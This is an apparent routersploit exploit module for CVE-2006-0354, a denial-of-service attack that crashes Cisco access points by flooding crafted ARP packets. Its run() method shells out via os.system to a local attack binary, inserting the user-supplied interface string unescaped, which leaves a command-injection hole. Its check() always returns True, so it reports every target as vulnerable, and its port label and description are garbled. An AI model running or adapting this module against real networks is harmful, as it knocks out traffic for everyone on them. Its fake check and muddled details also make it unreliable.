



import sys,os

from routersploit.core.exploit import *

from routersploit.core.http.http_client import HTTPClient

from ctypes import *



class Exploit(HTTPClient):



    __info__ = {

        "name": "cve_2006_0354",

        "description": "The vulnerability exists in the way the affected versions. "
                       "below handle ARP replies, if enough specially crafted ARP packets are sent "
                       "on the network with the affected systems it will cause the access point memory "
                       "exhaustion which will in a few seconds (depending on the speed of the attacker"
                       "and the memory of the target) crash the system, making all ingoing/outgoing traffic stopped.",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "www.framirez.com",

        ),

        "devices": (

            "Cisco, cve_2006_0354"
        ),
    }


    port = OptPort(80, "Target FTP port")
    interface = OptString("","Interfaces to leverage")
    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = './{} {}'.format('cve_2006_0354',self.interface)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True
